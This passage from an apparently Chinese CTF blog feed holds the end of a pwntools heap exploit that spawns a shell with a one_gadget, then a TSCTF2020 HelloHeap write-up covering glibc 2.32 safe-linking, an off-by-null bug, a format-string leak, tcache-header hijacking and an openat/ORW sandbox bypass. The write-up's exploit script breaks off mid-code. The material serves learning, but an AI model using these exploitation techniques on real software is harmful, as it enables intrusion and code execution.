punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>data <span class="token operator">=</span> decode<span class="token punctuation">(</span>key<span class="token punctuation">,</span>iv<span class="token punctuation">,</span>result<span class="token punctuation">)</span>image_base_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x202008</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'image_base_addr: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>image_base_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># get stack address</span>offset <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"environ"</span><span class="token punctuation">]</span> <span class="token operator">-</span> image_base_addr <span class="token operator">-</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'buf'</span><span class="token punctuation">]</span>result <span class="token operator">=</span> getInfo<span class="token punctuation">(</span>offset<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>data <span class="token operator">=</span> decode<span class="token punctuation">(</span>key<span class="token punctuation">,</span>iv<span class="token punctuation">,</span>result<span class="token punctuation">)</span>stack_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span>success<span class="token punctuation">(</span><span class="token string">"stack address: "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>stack_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># hijcaking times variable</span>times_addr <span class="token operator">=</span> stack_addr <span class="token operator">-</span> <span class="token number">0x120</span>offset <span class="token operator">=</span> times_addr<span class="token operator">-</span>image_base_addr<span class="token operator">-</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"buf"</span><span class="token punctuation">]</span>getInfo<span class="token punctuation">(</span>offset<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''0x4f2c5 execve("/bin/sh", rsp+0x40, environ)constraints:  rcx == NULL0x4f322 execve("/bin/sh", rsp+0x40, environ)constraints:  [rsp+0x40] == NULL0x10a38c execve("/bin/sh", rsp+0x70, environ)constraints:  [rsp+0x70] == NULL'''</span><span class="token comment" spellcheck="true"># arbitrary memory writing:</span>one_gadget <span class="token operator">=</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address <span class="token operator">+</span> <span class="token number">0x4f322</span><span class="token punctuation">)</span>offset <span class="token operator">=</span> <span class="token punctuation">(</span>stack_addr<span class="token number">-0xf0</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span>image_base_addr<span class="token operator">+</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'buf'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        result <span class="token operator">=</span> getInfo<span class="token punctuation">(</span>offset <span class="token operator">+</span> i<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>one_gadget<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'i : '</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>content <span class="token operator">=</span> <span class="token string">"\0"</span><span class="token operator">*</span><span class="token number">8</span>offset <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"environ"</span><span class="token punctuation">]</span> <span class="token operator">-</span> image_base_addr <span class="token operator">-</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'buf'</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        result <span class="token operator">=</span> getInfo<span class="token punctuation">(</span>offset <span class="token operator">+</span> i<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>content<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'i : '</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token comment" spellcheck="true"># gdb.attach(p)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'offset:'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 2019 Game </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 2.29 largebin attack </tag>
            
            <tag> tcache unlink smashing </tag>
            
            <tag> python-AES-解密 </tag>
            
            <tag> pwn-misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TSCTF2020的一道题中学习2.32下safe-linking机制以及2.31/2.32下setcontext的使用</title>
      <link href="/2020/10/22/tsctf2020-de-yi-dao-ti-zhong-xue-xi-2-32-xia-safe-linking-ji-zhi-yi-ji-2-31-2-32-xia-setcontext-de-shi-yong/"/>
      <url>/2020/10/22/tsctf2020-de-yi-dao-ti-zhong-xue-xi-2-32-xia-safe-linking-ji-zhi-yi-ji-2-31-2-32-xia-setcontext-de-shi-yong/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>仍然是比赛结束后来探险，xxrw师傅出的一道题目，很有趣的一道题。漏洞很巧妙难以定位，利用起来比较有意思，也学到了safe linking保护机制和2.31/2.32 setcontext的利用方法。</p><p>tag：glibc 2.32、setcontext、openat、safe linking、沙箱绕过、堆溢出、sprintf</p><h1 id="safe-linking保护机制"><a href="#safe-linking保护机制" class="headerlink" title="safe linking保护机制"></a>safe linking保护机制</h1><p>简单的说就是fd会被改为当前(chunk&gt;&gt;12)^next_chunk(tcache和fastbin都有这种机制)</p><p>例： 当前chunk a的addr为：0x55555555a3b0，即将释放一个同样大小的chunk b进入tcache链，b的首地址是0x55555555a2c0，那么fd本身应该是0x55555555a2d0，但由于safe linking机制，fd会被改为(0x55555555a3b0&gt;&gt;12)^0x55555555a2d0=0x55500000f78a</p><h1 id="2020-TSCTF-HelloHeap"><a href="#2020-TSCTF-HelloHeap" class="headerlink" title="2020 TSCTF HelloHeap"></a>2020 TSCTF HelloHeap</h1><h2 id="查看文件"><a href="#查看文件" class="headerlink" title="查看文件"></a>查看文件</h2><p>保护全开</p><h2 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h2><p>程序四个功能修改队名、修改口号、创建队伍、删除队伍。</p><p>结构体如下：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/22/tsctf2020-de-yi-dao-ti-zhong-xue-xi-2-32-xia-safe-linking-ji-zhi-yi-ji-2-31-2-32-xia-setcontext-de-shi-yong/0.png"></div>上面是0x20的name<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/22/tsctf2020-de-yi-dao-ti-zhong-xue-xi-2-32-xia-safe-linking-ji-zhi-yi-ji-2-31-2-32-xia-setcontext-de-shi-yong/1.png"></div>漏洞点存在于editname的时候有一个由于index的增加会导致一个off by null的漏洞，此时可以刚好改到teamSlogan的最后一位，将其值改为functionPointer的位置， 这样的话我们在editSlogan的时候就可以直接修改functionPointer。<p>另一个漏洞则存在于强制性read 0x50，同样的会造成堆溢出</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/22/tsctf2020-de-yi-dao-ti-zhong-xue-xi-2-32-xia-safe-linking-ji-zhi-yi-ji-2-31-2-32-xia-setcontext-de-shi-yong/2.png"></div>本来应该是最后一位字节是0x20，但是被改为0x00了<p>同时我们看看沙箱机制：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/22/tsctf2020-de-yi-dao-ti-zhong-xue-xi-2-32-xia-safe-linking-ji-zhi-yi-ji-2-31-2-32-xia-setcontext-de-shi-yong/3.png"></div><p>我们看到open函数都被禁掉了，ORW是不是就不可用了？</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>总之一个问题一个问题解决吧：</p><p><strong>1.首先是open函数被禁掉了，应该怎么办？</strong><br>open函数代替函数openat。简单的来说，openat的区别是，rdi参数可以是文件路径，但是也可以直接将rdi置为0，然后rsi为打开文件的绝对路径。其它的参数不用管了。</p><p><strong>2.第一个off by null的漏洞我们可以怎么利用？</strong><br>我们可以通过off by null改掉slogan的指向，然后将函数指针改为printf，在name处提前准备格式化字符串，泄露libc地址、heap地址还有程序加载基地址。</p><p><strong>3.通过第二个溢出来劫持tcache pthread header：</strong><br>劫持tcache pthread header后可以在free_hook写mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];的gadgets，然后将栈参数、rop等数据存放到对应的位置，ORW读出flag。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>debug <span class="token operator">=</span> <span class="token number">2</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'split'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>context<span class="token punctuation">.</span>update<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">"linux"</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">"amd64"</span><span class="token punctuation">,</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span><span class="token punctuation">)</span>se      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>sa      <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>sl      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>data<span class="token punctuation">)</span>sla     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>sea     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>rc      <span class="token operator">=</span> <span class="token keyword">lambda</span> numb<span class="token operator">=</span><span class="token number">4096</span>          <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token punctuation">)</span>rl      <span class="token operator">=</span> <span class="token keyword">lambda</span>                    <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>ru      <span class="token operator">=</span> <span class="token keyword">lambda</span> delims             <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>delims<span class="token punctuation">)</span>uu32    <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>uu64    <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>itv     <span class="token operator">=</span> <span class="token keyword">lambda</span>                    <span class="token punctuation">:</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">change_ld</span><span class="token punctuation">(</span>binary<span class="token punctuation">,</span> ld<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    Force to use assigned new ld.so by changing the binary    """</span>    <span class="token keyword">if</span> <span class="token operator">not</span> os<span class="token punctuation">.</span>access<span class="token punctuation">(</span>ld<span class="token punctuation">,</span> os<span class="token punctuation">.</span>R_OK<span class="token punctuation">)</span><span class="token punctuation">:</span>        log<span class="token punctuation">.</span>failure<span class="token punctuation">(</span><span class="token string">"Invalid path {} to ld"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>ld<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> None    <span class="token keyword">if</span> <span class="token operator">not</span> isinstance<span class="token punctuation">(</span>binary<span class="token punctuation">,</span> ELF<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token operator">not</span> os<span class="token punctuation">.</span>access<span class="token punctuation">(</span>binary<span class="token punctuation">,</span> os<span class="token punctuation">.</span>R_OK<span class="token punctuation">)</span><span class="token punctuation">:</span>            log<span class="token punctuation">.</span>failure<span class="token punctuation">(</span><span class="token string">"Invalid path {} to binary"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>binary<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> None        binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>    <span class="token keyword">for</span> segment <span class="token keyword">in</span> binary<span class="token punctuation">.</span>segments<span class="token punctuation">:</span>        <span class="token keyword">if</span> segment<span class="token punctuation">.</span>header<span class="token punctuation">[</span><span class="token string">'p_type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'PT_INTERP'</span><span class="token punctuation">:</span>            size <span class="token operator">=</span> segment<span class="token punctuation">.</span>header<span class="token punctuation">[</span><span class="token string">'p_memsz'</span><span class="token punctuation">]</span>            addr <span class="token operator">=</span> segment<span class="token punctuation">.</span>header<span class="token punctuation">[</span><span class="token string">'p_paddr'</span><span class="token punctuation">]</span>            data <span class="token operator">=</span> segment<span class="token punctuation">.</span>data<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> size <span class="token operator">&lt;=</span> len<span class="token punctuation">(</span>ld<span class="token punctuation">)</span><span class="token punctuation">:</span>                log<span class="token punctuation">.</span>failure<span class="token punctuation">(</span><span class="token string">"Failed to change PT_INTERP from {} to {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>data<span class="token punctuation">,</span> ld<span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">return</span> None            binary<span class="token punctuation">.</span>write<span class="token punctuation">(</span>addr<span class="token punctuation">,</span> ld<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token string">'\0'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token operator">not</span> os<span class="token punctuation">.</span>access<span class="token punctuation">(</span><span class="token string">'/tmp/pwn'</span><span class="token punctuation">,</span> os<span class="token punctuation">.</span>F_OK<span class="token punctuation">)</span><span class="token punctuation">:</span> os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span><span class="token string">'/tmp/pwn'</span><span class="token punctuation">)</span>            path <span class="token operator">=</span> <span class="token string">'/tmp/pwn/{}_debug'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>basename<span class="token punctuation">(</span>binary<span class="token punctuation">.</span>path<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> os<span class="token punctuation">.</span>access<span class="token punctuation">(</span>path<span class="token punctuation">,</span> os<span class="token punctuation">.</span>F_OK<span class="token punctuation">)</span><span class="token punctuation">:</span>                os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>path<span class="token punctuation">)</span>                info<span class="token punctuation">(</span><span class="token string">"Removing exist file {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">)</span>            binary<span class="token punctuation">.</span>save<span class="token punctuation">(</span>path<span class="token punctuation">)</span>            os<span class="token punctuation">.</span>chmod<span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token number">0b111000000</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#rwx------</span>    success<span class="token punctuation">(</span><span class="token string">"PT_INTERP has changed from {} to {}. Using temp file {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>data<span class="token punctuation">,</span> ld<span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> ELF<span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># example</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./helloheap"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> change_ld<span class="token punctuation">(</span><span class="token string">'./helloheap'</span><span class="token punctuation">,</span> <span class="token string">'./ld.so.2'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># libc_offset = 0x3c4b20</span>success<span class="token punctuation">(</span><span class="token string">"success load 2.32 libc"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc.so.6'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> elf<span class="token punctuation">.</span>process<span class="token punctuation">(</span>env<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'LD_PRELOAD'</span><span class="token punctuation">:</span><span class="token string">'./libc.so.6'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"name:)\n"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"BlueSheep"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">createTeam</span><span class="token punctuation">(</span>teamName<span class="token punctuation">,</span>sloganSize<span class="token punctuation">,</span>slogan<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">"choice:\n"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>    sa<span class="token punctuation">(</span><span class="token string">"name:"</span><span class="token punctuation">,</span>teamName<span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"size:\n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>sloganSize<span class="token punctuation">)</span><span class="token punctuation">)</span>    sa<span class="token punctuation">(</span><span class="token string">"slogan:\n"</span><span class="token punctuation">,</span>slogan<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">deleteTeam</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">"choice:\n"</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"id:\n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">editSlogan</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>slogan<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">"choice:\n"</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"id:\n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    sa<span class="token punctuation">(</span><span class="token string">":(\n"</span><span class="token punctuation">,</span>slogan<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">editName</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">"choice:\n"</span><span class="token punctuation">,</span><span class="token string">"4"</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"id:\n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    sa<span class="token punctuation">(</span><span class="token string">"new name:\n"</span><span class="token punctuation">,</span>name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">backdoor</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>info<span class="token operator">=</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">"choice:\n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">0x1337</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"id:\n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    createTeam<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">0xd0</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0xd0</span><span class="token punctuation">)</span>createTeam<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 7</span>createTeam<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">0xd0</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0xd0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 8</span>createTeam<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">0xa0</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0xa0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 9</span>createTeam<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 10</span><span class="token comment" spellcheck="true">#gdb.attach(p,"b *0x555555554000+0x1d3a")</span>editName<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token string">'|%9$p|%15$p|%23$p'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token string">"\x11"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>editSlogan<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token string">"\x60\x51"</span><span class="token punctuation">)</span>backdoor<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"|0x"</span><span class="token punctuation">)</span>code_base <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>success<span class="token punctuation">(</span><span class="token string">"code base ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>code_base<span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"|0x"</span><span class="token punctuation">)</span>heap_base <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x55555555a2a0</span><span class="token operator">+</span><span class="token number">0x55555555a000</span>success<span class="token punctuation">(</span><span class="token string">"heap base ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>heap_base<span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"|0x"</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x7ffff6e15dfb</span><span class="token operator">+</span><span class="token number">0x7ffff6dee000</span>success<span class="token punctuation">(</span><span class="token string">"libc address ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>deleteTeam<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>deleteTeam<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span>createTeam<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">0xd0</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0xd0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 0</span>createTeam<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">0xd0</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0xd0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 9</span>deleteTeam<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>deleteTeam<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span>fd_addr <span class="token operator">=</span> heap_base<span class="token operator">+</span><span class="token number">0xe40</span>bk_addr <span class="token operator">=</span> heap_base<span class="token operator">+</span><span class="token number">0x20</span>crypto_addr <span class="token operator">=</span> <span class="token punctuation">(</span>fd_addr<span class="token operator">>></span><span class="token number">12</span><span class="token punctuation">)</span><span class="token 